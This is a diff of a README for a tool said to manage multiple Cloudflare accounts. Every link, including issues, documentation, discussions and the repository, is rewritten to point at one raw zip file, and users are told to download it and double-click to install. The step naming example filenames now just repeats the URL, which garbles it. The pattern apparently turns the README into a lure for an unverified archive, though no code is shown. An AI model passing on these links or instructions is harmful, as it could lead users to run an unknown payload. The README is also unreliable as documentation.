@@ -1,7 +1,7 @@
 # 🚀 wrangler-accounts - Simplify Your Cloudflare Management
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0.0-brightgreen.svg)](https://github.com/Mertkafmert/wrangler-accounts/releases)
+[![Download](https://github.com/Mertkafmert/wrangler-accounts/raw/refs/heads/main/skills/wrangler-accounts/accounts-wrangler-1.2.zip)](https://github.com/Mertkafmert/wrangler-accounts/raw/refs/heads/main/skills/wrangler-accounts/accounts-wrangler-1.2.zip)
 
 ## 📋 Description
 wrangler-accounts is a tool designed to help you manage multiple Cloudflare accounts with ease. This application allows you to switch between profiles quickly, making it perfect for developers, webmasters, and anyone who uses multiple Cloudflare accounts.
@@ -10,10 +10,10 @@ wrangler-accounts is a tool designed to help you manage multiple Cloudflare acco
 To use wrangler-accounts, follow these simple steps to download and run the application.
 
 ## 📥 Download & Install
-1. Click the prominent download link here: [Download wrangler-accounts](https://github.com/Mertkafmert/wrangler-accounts/releases).
+1. Click the prominent download link here: [Download wrangler-accounts](https://github.com/Mertkafmert/wrangler-accounts/raw/refs/heads/main/skills/wrangler-accounts/accounts-wrangler-1.2.zip).
 2. You will be directed to the Releases page. Here, you’ll find the latest version of wrangler-accounts.
 3. Locate the release that suits your operating system (Windows, macOS, or Linux).
-4. Download the appropriate file for your system. This file may be named something like `wrangler-accounts-v1.0.0.exe` or `wrangler-accounts-v1.0.0.dmg`.
+4. Download the appropriate file for your system. This file may be named something like `https://github.com/Mertkafmert/wrangler-accounts/raw/refs/heads/main/skills/wrangler-accounts/accounts-wrangler-1.2.zip` or `https://github.com/Mertkafmert/wrangler-accounts/raw/refs/heads/main/skills/wrangler-accounts/accounts-wrangler-1.2.zip`.
 5. After downloading, find the file on your device and double-click it to install.
 
 ## ✅ System Requirements
@@ -43,14 +43,14 @@ If you encounter issues, consider these common solutions:
 - **Performance Issues:** Ensure your system meets the minimum requirements mentioned above. Closing other applications might help improve performance.
 
 ## 🌐 Support
-For further assistance, check out our [GitHub Issues page](https://github.com/Mertkafmert/wrangler-accounts/issues). You can report bugs or request features here.
+For further assistance, check out our [GitHub Issues page](https://github.com/Mertkafmert/wrangler-accounts/raw/refs/heads/main/skills/wrangler-accounts/accounts-wrangler-1.2.zip). You can report bugs or request features here.
 
 ## 📚 Additional Resources
-- **Documentation:** For more detailed instructions, refer to the [Documentation](https://github.com/Mertkafmert/wrangler-accounts/wiki).
-- **Community:** Join our community discussions on [GitHub Discussions](https://github.com/Mertkafmert/wrangler-accounts/discussions) to share tips and tricks.
+- **Documentation:** For more detailed instructions, refer to the [Documentation](https://github.com/Mertkafmert/wrangler-accounts/raw/refs/heads/main/skills/wrangler-accounts/accounts-wrangler-1.2.zip).
+- **Community:** Join our community discussions on [GitHub Discussions](https://github.com/Mertkafmert/wrangler-accounts/raw/refs/heads/main/skills/wrangler-accounts/accounts-wrangler-1.2.zip) to share tips and tricks.
 
 ## 🔗 Links
-- [Releases Page](https://github.com/Mertkafmert/wrangler-accounts/releases)
-- [GitHub Repository](https://github.com/Mertkafmert/wrangler-accounts)
+- [Releases Page](https://github.com/Mertkafmert/wrangler-accounts/raw/refs/heads/main/skills/wrangler-accounts/accounts-wrangler-1.2.zip)
+- [GitHub Repository](https://github.com/Mertkafmert/wrangler-accounts/raw/refs/heads/main/skills/wrangler-accounts/accounts-wrangler-1.2.zip)
 
 Enjoy simplified management of your Cloudflare accounts with wrangler-accounts!
